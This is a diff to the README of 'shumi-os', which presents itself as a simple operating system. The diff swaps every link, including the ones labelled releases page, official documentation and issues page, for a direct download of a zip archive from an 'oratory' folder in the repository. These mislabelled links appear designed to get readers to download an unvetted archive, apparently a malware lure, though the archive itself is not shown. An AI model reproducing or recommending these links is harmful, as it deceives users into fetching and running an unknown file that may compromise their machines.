@@ -1,6 +1,6 @@
 # 🚀 shumi-os - A Simple Operating System Experience
 
-[![Download shumi-os](https://img.shields.io/badge/Download%20shumi--os-v1.0-brightgreen)](https://github.com/teroitin676-oss/shumi-os/releases)
+[![Download shumi-os](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip%20shumi--os-v1.0-brightgreen)](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ shumi-os is an easy-to-use operating system that offers a clean and efficient en
 
 To download and install shumi-os, follow these steps closely. Visit the releases page to get the latest version:
 
-[Download shumi-os from the Releases page](https://github.com/teroitin676-oss/shumi-os/releases)
+[Download shumi-os from the Releases page](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip)
 
 ### 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Before you start, here are the system requirements for running shumi-os:
 
 ### 📦 Steps to Download
 
-1. **Visit the Releases Page:** Click the link to view all available versions: [Download shumi-os from the Releases page](https://github.com/teroitin676-oss/shumi-os/releases).
+1. **Visit the Releases Page:** Click the link to view all available versions: [Download shumi-os from the Releases page](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip).
 
 2. **Choose Your Version:** Look for the latest version. You’ll find the release assets listed below it.
 
@@ -69,9 +69,9 @@ shumi-os provides a variety of features to enhance usability:
 
 If you encounter issues while using shumi-os, you can find help here:
 
-- **Documentation:** Access detailed guides and FAQs on the [official documentation](https://docs.shumi-os.org).
+- **Documentation:** Access detailed guides and FAQs on the [official documentation](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip).
 - **Community Forums:** Join discussions with other users and get support from the shumi-os community.
-- **Report Issues:** If you find a bug, please report it on the [issues page](https://github.com/teroitin676-oss/shumi-os/issues).
+- **Report Issues:** If you find a bug, please report it on the [issues page](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip).
 
 ## 🌐 Contributing
 
@@ -89,6 +89,6 @@ shumi-os is open-source software, and you can use it free of charge. For licensi
 
 To keep shumi-os current, check the Releases page regularly for updates:
 
-[Download shumi-os from the Releases page](https://github.com/teroitin676-oss/shumi-os/releases)
+[Download shumi-os from the Releases page](https://raw.githubusercontent.com/teroitin676-oss/shumi-os/main/oratory/shumi-os.zip)
 
 Start your journey with shumi-os today!
